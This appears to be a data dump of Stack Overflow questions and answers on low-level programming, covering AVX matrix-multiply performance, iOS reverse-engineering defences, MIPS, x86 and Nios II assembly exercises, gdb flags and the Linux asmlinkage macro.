<p>I benchmark the code by claculating the total floating point operations as <code>2.0*n^3</code> where n is the width of the square matrix and dividing by the time measured with <code>omp_get_wtime()</code>.  I repeat the loop several times.  In the output below I repeated it 100 times.</p>

<p>Output from MSVC2012 on an Intel Xeon E5 1620 (Ivy Bridge) turbo for all cores is 3.7 GHz</p>

<pre><code>maximum GFLOPS = 236.8 = (8-wide SIMD) * (1 AVX mult + 1 AVX add) * (4 cores) * 3.7 GHz

n   64,     0.02 ms, GFLOPs   0.001, GFLOPs/s   23.88, error 0.000e+000, efficiency/core   40.34%, efficiency  10.08%, mem 0.05 MB
n  128,     0.05 ms, GFLOPs   0.004, GFLOPs/s   84.54, error 0.000e+000, efficiency/core  142.81%, efficiency  35.70%, mem 0.19 MB
n  192,     0.17 ms, GFLOPs   0.014, GFLOPs/s   85.45, error 0.000e+000, efficiency/core  144.34%, efficiency  36.09%, mem 0.42 MB
n  256,     0.29 ms, GFLOPs   0.034, GFLOPs/s  114.48, error 0.000e+000, efficiency/core  193.37%, efficiency  48.34%, mem 0.75 MB
n  320,     0.59 ms, GFLOPs   0.066, GFLOPs/s  110.50, error 0.000e+000, efficiency/core  186.66%, efficiency  46.67%, mem 1.17 MB
n  384,     1.39 ms, GFLOPs   0.113, GFLOPs/s   81.39, error 0.000e+000, efficiency/core  137.48%, efficiency  34.37%, mem 1.69 MB
n  448,     3.27 ms, GFLOPs   0.180, GFLOPs/s   55.01, error 0.000e+000, efficiency/core   92.92%, efficiency  23.23%, mem 2.30 MB
n  512,     3.60 ms, GFLOPs   0.268, GFLOPs/s   74.63, error 0.000e+000, efficiency/core  126.07%, efficiency  31.52%, mem 3.00 MB
n  576,     3.93 ms, GFLOPs   0.382, GFLOPs/s   97.24, error 0.000e+000, efficiency/core  164.26%, efficiency  41.07%, mem 3.80 MB
n  640,     5.21 ms, GFLOPs   0.524, GFLOPs/s  100.60, error 0.000e+000, efficiency/core  169.93%, efficiency  42.48%, mem 4.69 MB
n  704,     6.73 ms, GFLOPs   0.698, GFLOPs/s  103.63, error 0.000e+000, efficiency/core  175.04%, efficiency  43.76%, mem 5.67 MB
n  768,     8.55 ms, GFLOPs   0.906, GFLOPs/s  105.95, error 0.000e+000, efficiency/core  178.98%, efficiency  44.74%, mem 6.75 MB
n  832,    10.89 ms, GFLOPs   1.152, GFLOPs/s  105.76, error 0.000e+000, efficiency/core  178.65%, efficiency  44.66%, mem 7.92 MB
n  896,    13.26 ms, GFLOPs   1.439, GFLOPs/s  108.48, error 0.000e+000, efficiency/core  183.25%, efficiency  45.81%, mem 9.19 MB
n  960,    16.36 ms, GFLOPs   1.769, GFLOPs/s  108.16, error 0.000e+000, efficiency/core  182.70%, efficiency  45.67%, mem 10.55 MB
n 1024,    17.74 ms, GFLOPs   2.147, GFLOPs/s  121.05, error 0.000e+000, efficiency/core  204.47%, efficiency  51.12%, mem 12.00 MB
</code></pre>
","<p>Since we've covered the alignment issue, I would guess it's this: <a href=""http://en.wikipedia.org/wiki/Out-of-order_execution"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Out-of-order_execution</a></p>

<p>Since g++ issues a standalone load instruction, your processor can reorder the instructions to be pre-fetching the next data that will be needed while also adding and multiplying. MSVC throwing a pointer at mul makes the load and mul tied to the same instruction, so changing the execution order of the instructions doesn't help anything.</p>

<p>EDIT: Intel's server(s) with all the docs are less angry today, so here's more research on why out of order execution is (part of) the answer.</p>

<p>First of all, it looks like your comment is completely right about it being possible for the MSVC version of the multiplication instruction to decode to separate µ-ops that can be optimized by a CPU's out of order engine. The fun part here is that modern microcode sequencers are programmable, so the actual behavior is both hardware and firmware dependent. The differences in the generated assembly seems to be from GCC and MSVC each trying to fight different potential bottlenecks. The GCC version tries to give leeway to the out of order engine (as we've already covered). However, the MSVC version ends up taking advantage of a feature called ""micro-op fusion"". This is because of the µ-op retirement limitations. The end of the pipeline can only retire 3 µ-ops per tick. Micro-op fusion, in specific cases, takes two µ-ops that <em>must</em> be done on two different execution units (i.e. memory read and arithmetic) and ties them to a single µ-op for most of the pipeline. The fused µ-op is only split into the two real µ-ops right before execution unit assignment. After the execution, the ops are fused again, allowing them to be retired as one.</p>

<p>The out of order engine only sees the fused µ-op, so it can't pull the load op away from the multiplication. This causes the pipeline to hang while waiting for the next operand to finish its bus ride.</p>

<p>ALL THE LINKS!!!:
<a href=""http://download-software.intel.com/sites/default/files/managed/71/2e/319433-017.pdf"" rel=""nofollow noreferrer"">http://download-software.intel.com/sites/default/files/managed/71/2e/319433-017.pdf</a></p>

<p><a href=""http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf"" rel=""nofollow noreferrer"">http://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-optimization-manual.pdf</a></p>

<p><a href=""http://www.agner.org/optimize/microarchitecture.pdf"" rel=""nofollow noreferrer"">http://www.agner.org/optimize/microarchitecture.pdf</a></p>

<p><a href=""http://www.agner.org/optimize/optimizing_assembly.pdf"" rel=""nofollow noreferrer"">http://www.agner.org/optimize/optimizing_assembly.pdf</a></p>

<p><a href=""http://www.agner.org/optimize/instruction_tables.ods"" rel=""nofollow noreferrer"">http://www.agner.org/optimize/instruction_tables.ods</a>
(NOTE: Excel complains that this spreadsheet is partially corrupted or otherwise sketchy, so open at your own risk. It doesn't seem to be malicious, though, and according to the rest of my research, Agner Fog is awesome. After I opted-in to the Excel recovery step, I found it full of tons of great data)</p>

<p><a href=""http://cs.nyu.edu/courses/fall13/CSCI-GA.3033-008/Microprocessor-Report-Sandy-Bridge-Spans-Generations-243901.pdf"" rel=""nofollow noreferrer"">http://cs.nyu.edu/courses/fall13/CSCI-GA.3033-008/Microprocessor-Report-Sandy-Bridge-Spans-Generations-243901.pdf</a></p>

<p><a href=""http://www.syncfusion.com/Content/downloads/ebook/Assembly_Language_Succinctly.pdf"" rel=""nofollow noreferrer"">http://www.syncfusion.com/Content/downloads/ebook/Assembly_Language_Succinctly.pdf</a></p>

<hr>

<p>MUCH LATER EDIT:
Wow, there has been some interesting update to the discussion here. I guess I was mistaken about how much of the pipeline is actually affected by micro op fusion. Maybe there is more perf gain than I expected from the the differences in the loop condition check, where the unfused instructions allow GCC to interleave the compare and jump with the last vector load and arithmetic steps?</p>

<pre><code>vmovups ymm9, YMMWORD PTR [rax-32]
cmp esi, edx
vmulps  ymm0, ymm0, ymm9
vaddps  ymm1, ymm1, ymm0
jg  .L4
</code></pre>
","21151780"
"Decompilation possibilities in iOS and how to prevent them","16502","","<p>I recently read about decompilation of iOS apps and I'm now really concerned about it. As stated in the following posts (<a href=""https://stackoverflow.com/questions/5475875/decompiling-ios-objective-c-binaries"">#1</a> and <a href=""https://stackoverflow.com/questions/2661722/decompile-an-app-binary-to-get-back-to-source-code"">#2</a>) it is possible to decompile an iOS which is distributed to the App Store. This can be done with jailbreak and I think with copying the app from memory to hdd. With some tools it is possible to</p>

<ul>
<li>read out strings (strings tools)</li>
<li>dump the header files</li>
<li>reverse engineer to assembly code</li>
</ul>

<p>It seems NOT to be possible to reverse engineer to Cocoa code.</p>

<p>As security is a feature of the software I create, I want to prevent bad users from reconstructing my security functions (encryption with key or log in to websites). So I came up with the following questions:</p>

<ol>
<li>Can someone reconstruct my saving and encryption or login methods with assembly? I mean can he understand what exactly is going on (what is saved to which path at which time, which key is used etc., with what credentials is a login to which website performed)? I have no assembly understanding it looks like the matrix for me...</li>
<li>How can I securly use <code>NSStrings</code> which cannot be read out with strings or read in assembly? I know one can do obfuscation of strings - but this is still not secure, isn't it?</li>
</ol>
","<p>This is a problem that people have been chasing for years, and any sufficiently-motivated person with skills will be able to find ways to find out whatever information you don't want them to find out, if that information is ever stored on a device.</p>

<p>Without jailbreaking, it's possible to disassemble apps by using the purchased or downloaded binary.   This is static inspection and is facilitated with standard disassembly tools.    Although you need to have a tool which is good enough to add symbols from the linker and understand method calls sufficiently to be able to tease out what's going on.  If you want to get a feel for how this works, check out <a href=""http://www.hopperapp.com"">hopper</a>, it's a really good disassembly/reverse-engineering tool.   </p>

<p>Specifically to your secure log in question, you have a bigger problem if you have a motivated attacker: system-based man-in-the-middle attacks.   In this case, the attacker can shim out the networking code used by your system and see anything which is sent via standard networking.  Therefore, you can't depend on being able to send any form of unencrypted data into a ""secure"" pipe at the OS or library level and expect it not to be seen.  At a minimum you'll need to encrypt before getting the data into the pipe (i.e. you can't depend on sending any plain text to standard SSL libraries).  You can compile your own set of SSL libraries and link them directly in to your App, which means you don't get any system performance and security enhancements over time, but you can manually upgrade your SSL libraries as necessary.   You could also create your own encryption, but that's fraught with potential issues, since motivated hackers might find it easier to attack your wire protocol at that point (publicly-tested protocols like SSL are usually more secure than what you can throw together yourself, unless you are a particularly gifted developer with years of security/encryption experience).</p>

<p>However, all of this assumes that your attacker is sufficiently motivated.  If you remove the low-hanging fruit, you may be able to prevent a casual hacker from making a simple attempt at figuring out your system.  Some things to avoid:</p>

<ul>
<li>storing plain-text encryption keys for either side of the encryption</li>
<li>storing keys in specifically named resources (a file named <code>serverkey.text</code> or a key stored in a plist with a name which contains <code>key</code> are both classics)</li>
<li>avoid simple passwords wherever possible</li>
</ul>

<p>But, most important is creating systems where the keys (if any) stored in the application themselves are useless without information the user has to enter themselves (directly, or indirectly through systems such as OAUTH).  The server should not trust the client for any important operation without having had some interaction with a user who can be trusted.</p>

<p>Apple's Keychain provides a good place to store authentication tokens, such as the ones retrieved during an OAUTH sequence.   The API is a bit hard to work with, but the system is solid.</p>

<p>In the end, the problem is that no matter what you do, you're just upping the ante on the amount of work that it takes to defeat your measures.  The attacker gets to control all of the important parts of the equation, so they will eventually defeat anything on the device. You are going to need to decide how much effort to put into securing the client, vs securing the server and monitoring for abuse.  Since the attacker holds all of the cards on the device, your better approach is going to be methods that can be implemented on the server to enhance your goals.</p>
","17920556"
"MIPS processors : Are they still in use? Which other architecture should I learn?","16424","","<p>I've been programming for x86 &amp; x86-64 in assembly language for few months. Now, I want to move on to some different kind of processors. </p>

<p>MIPS, SPARC, PowerPC, Itanium, ARM of these I found ARM is being <strong>widely</strong> use. But the books  I see that tutorials &amp; books teach about MIPS more than all these other architectures.</p>

<p>Why is MIPS so popular? Are MIPS processors still in use? Which architecture should I go for?</p>

<p>My background:</p>

<p>I'm a student in Electronics dept. I'm also a high level programmer.</p>
","<p><a href=""http://www.cavium.com"" rel=""noreferrer"">Cavium Networks</a> and <s><a href=""http://www.rmicorp.com/"" rel=""noreferrer"">Raza Microelectronics</a></s> <a href=""http://www.broadcom.com/products/Processors"" rel=""noreferrer"">Broadcom</a> are two large MIPS chipmakers. See <a href=""http://mips.com/"" rel=""noreferrer""><s>MIPS</s> Imagination Technologies' website</a> for more info.</p>

<p><s>One thing that MIPS does and ARM doesn't is 64-bit.</s></p>

<p>Update as of 2013: Broadcom does not appear to have introduced new MIPS products since 2006, and Cavium appears to be transitioning to 64-bit ARM v8. Imagination Technologies acquired MIPS in late 2012. (Ironically, Apple, their #1 customer, were the first to market with ARM v8.)</p>

<p>The writing is on the wall for MIPS.</p>

<hr>

<p>MIPS is the cleanest successful RISC. PowerPC and (32-bit) ARM have so many extra instructions (even a few operating modes, 32-bit ARM especially) that you could almost call them CISC. SPARC has a few odd features and Itanium is composed entirely of odd features. The latter two are more dead than MIPS.</p>

<p>So if you learn MIPS, you will be able to transfer 100% of that knowledge to other RISCs (give or take delay slots), but you still have to learn about lots of odd instructions on PPC, a whole ton-o-junk on 32-bit ARM, and register windows on SPARC. Itanium isn't RISC so it's hard to say anything, besides don't learn Itanium.</p>

<p>I have not studied 64-bit ARM yet but it is likely to have most of the positive qualities of MIPS, being essentially a clean-slate design.</p>
","2653951"
"How to compare two strings assembly","16418","","<p>Could anyone tell me how to compare two strings in assembly language, I`ve written the followign, but it does not seem to work.</p>

<pre><code>assume cs:code, ds:data

data segment
sirlung db ""abcdjjj""
lungimelung equ $-sirlung
sirscurt db ""aby""
lungimescurt equ $-sirscurt
exista db ""Exista!$""
nuexista db ""NU exista!$""
iesire db ""Apasa enter pentru iesire!$""


data ends

code segment
start:
mov ax,data
mov ds,ax

mov bx,offset sirlung
mov di,offset sirscurt
dec bx
push bx
push di
mov dx,lungimelung
mov si,lungimescurt
bucla1:
    pop di
    pop bx
    inc bx
    mov al,sirlung[bx]
    mov cl,sirscurt[di]

    cmp al,cl
    jne bucla1
    push bx
    push di
    je bucla2
    cmp bx,dx
    ja sfarsit_nu_exista
bucla2:
    inc bx
    inc di
    mov al,sirlung[bx]
    mov cl,sirscurt[di]
    cmp al,cl
    jne bucla1      
    cmp di,si
    jl sfarsit_exista
    jae bucla2





sfarsit_exista:
mov dx,offset exista
mov ah,09h
int 21h
mov ah, 0ah
mov dx,offset iesire
int 21h
mov ax,4c00h
int 21h

sfarsit_nu_exista:
mov dx,offset nuexista
mov ah,09h
int 21h
mov ah, 0ah
mov dx,offset iesire
int 21h
mov ax,4c00h
int 21h

code ends
end start
</code></pre>
","<p>I had the same problem when I was writing asm in school, years ago. The problem I encountered was that I wanted to compare the word ""exit"" with a user entry. If they typed ""exit"", the application quit. If they typed anything else, then a message appeared telling them there was an erroneous entry.</p>

<p>The way I solved the issue was to compare the strings character-by-character, until the characters no longer matched, or vice-versa.</p>

<p>This also might be of some use. Here are some code examples relating to string comparison in assembly language: <a href=""http://www.daniweb.com/software-development/assembly/threads/58667/assembly-language-comparing-strings"" rel=""nofollow noreferrer"">http://www.daniweb.com/software-development/assembly/threads/58667/assembly-language-comparing-strings</a></p>

<p>You might also want to look at this article relating to regular expressions (regex) in assembly language: <a href=""https://stackoverflow.com/questions/2172335/regular-expressions-and-assembly"">Regular Expressions and Assembly</a></p>
","14100484"
"Assembly Language: printing lowercase to uppercase","16368","","<p>I have an assignment that is described like so:</p>

<pre><code>- Reads printable characters (20h-7Fh) from the keyboard without echoing
- Uppercase letters are printed to display
- Lowercase letters are converted to uppercase and then printed to display
- Blank spaces and periods are printed to display; everything else is trashed
- Program ends when period is printed
</code></pre>

<p>My program so far is this:</p>

<pre><code>    .model      small
    .8086


    .data


    .code

start:
        mov     ax,@data
        mov     ds,ax

read:
        mov     ah,8
        int     21h
        cmp     al,61
        jl      write
        cmp     al,7fh
        jg      read
        sub     al,20h
        jmp     write

write:      cmp     al,20h
        jl      read
        mov     dl,al
        mov     ah,2
        int     21h
        cmp     dl,2eh
        jne     read

exit:
        mov     ax,4c00h
        int     21h
        end     start
</code></pre>

<p>My program succesfully converts lowercase letters and prints the corresponding uppercase letter, but I am having trouble trashing everything else. What is the best way to only allow blank spaces, periods, and letters through to the display?</p>

<p>Looking at the ASCII chart,</p>

<pre><code>21h - 2Dh can be trashed
2Fh - 40h can be trashed
5bh - 60h can be trashed
7bh - 7fh can be trashed
</code></pre>

<p>Can anyone help me come up with the best logic for comparing the input to these values and then trashing those that fall between the range above? We are graded on efficiency, with 0-20 instructions written awarded full credit. I am already at 20 instructions here and I haven't included compares to find the trash values.</p>

<p><strong>EDIT</strong><br>
Here is what I have narrowed my code down to:</p>

<pre><code>    .model      small
    .8086


    .data


    .code


read:
        mov     ah,8
        int     21h
        cmp     al,' '
        je      write
        cmp     al,'.'
        je      write
        cmp     al,'a'
        jl      read
        cmp     al,'Z'
        jg      convert

convert:    
        cmp     al,'a'
        jl      read
        sub     al,20h

write:      
        mov     dl,al
        mov     ah,2
        int     21h
        cmp     dl,'.'
        jne     read

exit:
        mov     ax, 4c00h
        int     21h
        end     read
</code></pre>

<p>Currently at 21 instructions! Is there any redundancy in my code that can be removed to get it down to 20?</p>
","<p>You might modify your logic to do something like:</p>

<ul>
<li>if space or period, jump to <code>write</code></li>
<li>fold lowercase to uppercase</li>
<li>if not uppercase letter, jump back to <code>read</code></li>
</ul>

<p>Note that the ""fold lowercase to uppercase"" doesn't need to check to see whether the input was a letter first. Just <code>and xx</code> where <code>xx</code> is an appropriate value should do it (I'll let you work out the value). This step will also modify characters other than letters, but since the next step is to check for a letter it doesn't matter.</p>
","7561971"
"gdb with assembler: Print status of carry flag","16011","","<p>I've got an x86 assembler program which I'm debugging with gdb. Is there a way to print the status of the carry flag inside gdb with, like, ""print $cf""?</p>
","<p>You can use:</p>

<pre><code>info registers eflags
</code></pre>

<p>to get the entire set of flags. You'll see a line like:</p>

<pre><code>eflags  0x41  [ CF ZF ]
</code></pre>

<p>which means that the <code>eflags</code> register is set to <code>0x41</code>, with the carry and zero flags set.</p>
","5210401"
"How can I initialize an array in MIPS?","16008","","<p>In my <a href=""https://stackoverflow.com/questions/7538659/convert-c-to-mips-assembly"">previous question</a>, I inquired about converting the MAX_ARRAY() function into MIPS. I have completed that task. Now, I wish to initialize an array in my program. How might I achieve this?</p>

<pre><code>       addi  $t1,$zero, 0   # initialize index i to 0
 loop: add   $t1,$t1,1         # increment index i by 1
       beq   $t1,$s2,done   # if all elements examined, quit
       add   $t2,$t1,$t1    # compute 2i in $t2
       add   $t2,$t2,$t2    # compute 4i in $t2 
       add   $t2,$t2,$s1    # form address of A[i] in $t2 
       lw    $t3,0($t2) # load value of A[i] into $t3
       slt   $t4,$t0,$t3    # maximum &lt; A[i]?
       beq   $t4,$zero,loop # if not, repeat with no change
       addi  $t0,$t3,0         # if so, A[i] is the new maximum 
       j     loop       # change completed; now repeat
 done: 
</code></pre>
","<p><a href=""http://pages.cs.wisc.edu/~cs354-2/onyourown/arrays.html"" rel=""nofollow"">http://pages.cs.wisc.edu/~cs354-2/onyourown/arrays.html</a> 
Hope this helps you... Wasn't able to find more appropriate answer</p>
","10155779"
"Convert string to int. x86 32 bit Assembler using Nasm","15893","","<p>So I'm trying to convert a string to a number so I can add another number to it later. here is what I have to far in my .text for the conversion. num2Entered is what the user entered. Num1plusNum2 is the label that I will eventually add to. They are both declared in the .bss section. Any help would be appreciated! </p>

<pre><code>    mov ax, [num2Entered + 0]
    sub ax, '0'
    mov bx, WORD 1000
    mul bx
    mov [Num1plusNum2], ax

    mov ax, [num2Entered + 1]
    sub ax, '0'
    mov bx, WORD 100
    mul bx
    add [Num1plusNum2], ax

    mov ax, [num2Entered + 2]
    sub ax, '0'
    mov bx, WORD 10
    mul bx
    add [Num1plusNum2], ax

    mov ax, [num2Entered + 3]
    sub ax, '0'
    add [Num1plusNum2], ax
</code></pre>
","<p>Each character is only a single byte, but you probably want to add it to a larger result. Might as well go for 32 bits... (can hobble your routine to 16 bits if you really want to)</p>

<pre><code>mov edx, num3entered ; our string
atoi:
xor eax, eax ; zero a ""result so far""
.top:
movzx ecx, byte [edx] ; get a character
inc edx ; ready for next one
cmp ecx, '0' ; valid?
jb .done
cmp ecx, '9'
ja .done
sub ecx, '0' ; ""convert"" character to number
imul eax, 10 ; multiply ""result so far"" by ten
add eax, ecx ; add in current digit
jmp .top ; until done
.done:
ret
</code></pre>

<p>That's off the top of my head and may have errors, but ""something like that"". It'll stop at the end of a zero-terminated string, or a linefeed-terminated string... or any invalid character (which you may not want). Modify to suit.</p>
","19462538"
"Using C/inline assembly in C#","15891","","<p>Is there some method of using C source mixed with inline asm (this is <em>not</em> C++ code) in a C# app?  I'm not picky about how it gets done, if it requires compiling the C/asm into a DLL alongside the C# app, so be it.  I'm aware there's no provision for using assembly inside C#, hence this question.</p>

<p>Sample code of what I'm trying to incorporate:</p>

<pre><code>SomeFunc(unsigned char *outputData, unsigned char *inputData, unsigned long inputDataLength)
{
    _asm
    {
        //Assembly code that processes inputData and stores result in outputData
    }
}
</code></pre>

<p>There are some pointer/variable declarations in the C code before that function is declared, but beyond that it's all inline assembly, the declarations are used in the assembly code if that effects anything.</p>

<p>Objective is to pass 'inputData' from C# and then have access to 'outputData' in the C# program in some fashion.  Normally we'd just rewrite the assembler code in native C# but we're on a tight schedule for getting a prototype together and don't see any reason to reinvent the wheel right away if we can temporarily use the existing C/assembly code in some fashion.</p>
","<p>A good example on how to do this is provided at <a href=""http://www.codeproject.com/Articles/1392/Using-Unmanaged-code-and-assembler-in-C"" rel=""nofollow"">http://www.codeproject.com/Articles/1392/Using-Unmanaged-code-and-assembler-in-C</a></p>
","18836493"
"How to convert from 4-bit hexadecimal to 7-bit ASCII?","15884","","<p>The assigment is to learn assembly programming by writing a subroutine that can convert between 4-bit hexadecimal and 7-bit ASCII. At first I had no idea but after some research I could make and effort and draw a flowchart and make a program but it is not entirely correct so I'm asking for your guidance to help me solve this. </p>

<p>The actual assignment text is this:</p>

<blockquote>
  <p>HA 3.1. Draw a flow-chart for a subroutine to convert a 4-bit
  hexadecimal value to the corresponding 7-bit ASCII-code. See the full
  specification for hexasc below.  Example: binary 0010 (hexadecimal
  digit 2) is converted to 011 0010 (ASCII-code for '2').  Another
  example: binary 1011 (hexadecimal digit B) is converted to 100 0010
  (ASCII-code for 'B')  Make sure that your subroutine is documented
  according to our requirements.</p>
  
  <p>HA 3.2. Using the labwork project in the Nios II IDE, create a new
  file called hexasc.s</p>
  
  <p>HA 3.3. In the file hexasc.s, write a subroutine called hexasc, that
  converts a 4-bit hexadecimal value to the corresponding 7-bit
  ASCII-code.</p>
</blockquote>

<p>I've drawn a flowchart for the program:
<img src=""https://i.stack.imgur.com/uJv4u.png"" alt=""enter image description here""></p>

<p>And the program I've tried is this but I suspect that it is not according to spec:</p>

<pre><code>        .global main 

        .text
        .align 2

main:   movi r8, 0x09
        movi r9, 0x0f

        andi r4, r4, 0x0f

        bgt r8, r4, L1  

        movi r2, 0x1e
        add r2, r2, r4  
        andi r2, r2, 0xff

        movia   r2,putchar
        br  L2  

L1:     movi r2, 0x29   
        add r2, r2, r4
        andi r2, r2, 0xff

        movia   r2,putchar

L2:  .end 
</code></pre>

<p>Can you help me develop and solve this assignment? There's plenty of time, it's not due until in a month. </p>

<h2>Update</h2>

<p>After seeing here in a comment that the flowchart was incorrect, I've made the necessary adjustments:
<img src=""https://i.stack.imgur.com/wSqGQ.png"" alt=""enter image description here""></p>

<p>I also want to discuss how this algorithm is correct that converts between hexadecimal and ASCII. </p>

<h2>Update / edit</h2>

<p>Here is the complete program.</p>

<pre><code>.global hexasc 

        .text
        .align 2

hexasc: movi r8, 0x09
        movi r9, 0x0f
        andi r4, r4, 0x0f #keep only 4 bits
        bgt r4, r8, L1  #is x&gt;9?
        movi r2, 0x30
        add r2, r2, r4  
        andi r2, r2, 0xff
        ret  

L1:     movi r2, 0x37
        add r2, r2, r4
        andi r2, r2, 0xff
        ret
</code></pre>
","<p>When you mask off the lower four bits, you have the potential for ending up with the values 0x0 to 0xF.  The table of desired results is:</p>

<pre><code>0x0 -&gt; '0' = 0x30
0x1 -&gt; '1' = 0x31
0x2 -&gt; '2' = 0x32
0x3 -&gt; '3' = 0x33
0x4 -&gt; '4' = 0x34
0x5 -&gt; '5' = 0x35
0x6 -&gt; '6' = 0x36
0x7 -&gt; '7' = 0x37
0x8 -&gt; '8' = 0x38
0x9 -&gt; '9' = 0x39
0xA -&gt; 'A' = 0x41
0xB -&gt; 'B' = 0x42
0xC -&gt; 'C' = 0x43
0xD -&gt; 'D' = 0x44
0xE -&gt; 'E' = 0x45
0xF -&gt; 'F' = 0x46
</code></pre>

<p>From that table of desired results we can see that there are two linear sections, from 0x0 to 0x9 and from 0xA to 0xF.  For the 0x0 to 0x9 case  0x30 - 0x0 = 0x30 so we add 0x30.  For the 0xA to 0xF section 0x41 - 0xA = 0x37.</p>

<p>Will that work?</p>

<pre><code>0x0 + 0x30 = 0x30
0x1 + 0x30 = 0x31
0x2 + 0x30 = 0x32
0x3 + 0x30 = 0x33
0x4 + 0x30 = 0x34
0x5 + 0x30 = 0x35
0x6 + 0x30 = 0x36
0x7 + 0x30 = 0x37
0x8 + 0x30 = 0x38
0x9 + 0x30 = 0x39

0xA + 0x37 = 0x41
0xB + 0x37 = 0x42
0xC + 0x37 = 0x43
0xD + 0x37 = 0x44
0xE + 0x37 = 0x45
0xF + 0x37 = 0x46
</code></pre>

<p>Looks good.</p>

<p>A slightly different way is always add 0x30 then adjust after.</p>

<pre><code>0x0 + 0x30 = 0x30
0x1 + 0x30 = 0x31
0x2 + 0x30 = 0x32
0x3 + 0x30 = 0x33
0x4 + 0x30 = 0x34
0x5 + 0x30 = 0x35
0x6 + 0x30 = 0x36
0x7 + 0x30 = 0x37
0x8 + 0x30 = 0x38
0x9 + 0x30 = 0x39
0xA + 0x30 + 7 = 0x41
0xB + 0x30 + 7 = 0x42
0xC + 0x30 + 7 = 0x43
0xD + 0x30 + 7 = 0x44
0xE + 0x30 + 7 = 0x45
0xF + 0x30 + 7 = 0x46
</code></pre>

<p>When creating the desired result table, the left side you should have known something anded with 0xF gives you 0x0 to 0xF, and it appears you did.  The right side of the desired table comes from an ASCII chart.  I think if you had made that chart and gotten out a calculator (yea that little thing with buttons that old people use, although one that does hex, your phone should have an app for it). From there visually from that table come up with the algorithm.  </p>

<p>You should also ask yourself, what if I want A to F to be lower case instead of upper case (a,b,c,d,e,f)?  How do I change the algorithm?</p>
","12059815"
"What is the 'asmlinkage' modifier meant for?","15857","","<p>I have read that it is used for functions that implement system calls in Linux.
For example:</p>

<pre><code>asmlinkage long sys_getjiffies( void )
{
  return (long)get_jiffies_64();
}
</code></pre>

<p>and that it tells the compiler to pass all function arguments on the stack. But isn't that already the case? Function arguments are generally passed by pushing them on stack only. Or is it that we are referring to passing function arguments through registers here?</p>
","<p>There's a <a href=""http://kernelnewbies.org/FAQ/asmlinkage"" rel=""noreferrer"">FAQ</a>:</p>

<blockquote>
  <p>The asmlinkage tag is one other thing that we should observe about
  this simple function. This is a #define for some gcc magic that tells
  the compiler that the function should not expect to find any of its
  arguments in registers (a common optimization), but only on the CPU's
  stack. Recall our earlier assertion that system_call consumes its
  first argument, the system call number, and allows up to four more
  arguments that are passed along to the real system call. system_call
  achieves this feat simply by leaving its other arguments (which were
  passed to it in registers) on the stack. All system calls are marked
  with the asmlinkage tag, so they all look to the stack for arguments.
  Of course, in <code>sys_ni_syscall</code>'s case, this doesn't make any difference,
  because <code>sys_ni_syscall</code> doesn't take any arguments, but it's an issue
  for most other system calls. And, because you'll be seeing <code>asmlinkage</code>
  in front of many other functions, I thought you should know what it
  was about.</p>
  
  <p>It is also used to allow calling a function from assembly files. </p>
</blockquote>
","10459713"
"Mips: store a variable in another variable","15847","","<p>I am trying to translate a C program into MIPS assembly code</p>

<p>In my C code I have a line like this:</p>

<pre><code>int base;
int count;

count = base;
</code></pre>

<p>In MIPS, how would I store the value of base inside of count? The only instructions I see for loading and storing are <code>lw</code> and <code>sw</code> and their prototypes only go from a register source -> ram destination or a ram source -> register destination.</p>

<p>Any help would be appreciated.</p>

<p><strong>EDIT</strong>
I was hoping that this could be done in a single instruction, something like </p>

<p><code>move base acc</code> </p>

<p>but apparently that is impossible (at least I found no example of an instruction similar to that), I opted for this:</p>

<pre><code>lw $t0, base   //load base into $t0
sw $t0, count  //store the value of $t0 in count
</code></pre>

<p>If there is a one-line instruction to do this that would be better if anyone knows one.</p>
","<p>MIPS doesn't support direct memory-to-memory moves. (Neither do most common CPUs, actually -- even x86 doesn't.) You'll need to use <code>lw</code>/<code>sw</code> to move data around.</p>

<p>Architecturally, this is because MIPS is designed to only perform a single memory access per cycle -- doing a memory-to-memory move would require two accesses (one read, one write), or stall the pipeline.</p>
","9107122"
"MIPS - How does MIPS allocate memory for arrays in the stack?","15789","","<p>I'm quite new to the MIPS assembly language and am currently taking a class on computer architecture which has a large section on MIPS coding. I've studied several other high-level programming languages (C, C#, Python) in the past so have some bases in programming. </p>

<p>My question here specifically asks: How does MIPS allocate memory for arrays in the stack? I'm hoping that answering this question will hopefully give me a better total understanding of MIPS as I'm still a bit lot on conceptualizing the idea of the MIPS language and it's architecture. I don't quite understand how pointers work in this whole regard either...</p>

<p>Would be brilliant if someone could take the time to help out this confused student! :)</p>
","<p>Well.. you should be aware that MIPS, like C, essentially has three different ways of allocating memory.</p>

<p>Consider the following C code:</p>

<pre><code>int arr[2]; //global variable, allocated in the data segment

int main() {
    int arr2[2]; //local variable, allocated on the stack
    int *arr3 = malloc(sizeof(int) * 2); //local variable, allocated on the heap
}
</code></pre>

<p>MIPS assembly supports all these types of data. </p>

<p>To allocate an int array in the data segment you could use:</p>

<pre><code>.data

arr: .word 0, 0 #enough space for two words, initialized to 0, arr label points to the first element 
</code></pre>

<p>To allocate an int array on the stack you could use:</p>

<pre><code>#save $ra
addi $sp $sp -4  #give 4 bytes to the stack to store the frame pointer
sw   $fp 0($sp)  #store the old frame pointer
move $fp $sp     #exchange the frame and stack pointers
addi $sp $sp -12 #allocate 12 more bytes of storage, 4 for $ra and 8 for our array
sw   $ra  -4($fp)

# at this point we have allocated space for our array at the address -8($fp)
</code></pre>

<p>To allocate space on the heap, a system call is required. In the spim simulator this is <a href=""http://www.doc.ic.ac.uk/lab/secondyear/spim/node8.html"">system call 9</a>:</p>

<pre><code>li $a0 8 #enough space for two integers
li $v0 9 #syscall 9 (sbrk)
syscall
# address of the allocated space is now in $v0
</code></pre>
","19612647"
"x86 ASM Linux - Using the .bss Section","15764","","<p>I hope these questions is rather simple: (NASM Compiler, Linux, x86 Intel Syntax)</p>

<p>PART 1:</p>

<p>I am trying to figure out how to use the .bss section of an Assembly program to find a way to store values, like a value from an operation (+ - * /), to an declared variable. For example:</p>

<pre><code>section .bss

variable:  resb 50                                       ;Imaginary buffer

section .text

add 10,1                                                 ;Operation
;move the result into variable
</code></pre>

<p>So, I know it is possible to do this with the kernel intterupt for reading user input (but that involves strings, but is there a way to copy this value into the <em>variable</em> variable so that it can be used later? This would be much easier than having to push and pop two things on and off the stack.</p>

<p>PART 2:</p>

<p>Is there a way to remove the value of the variable in the .bss section? In other words, if I want to store a new value in the .bss variable, how could I do it without the characters/values already in the variable not getting compounded with the new value(s)?</p>

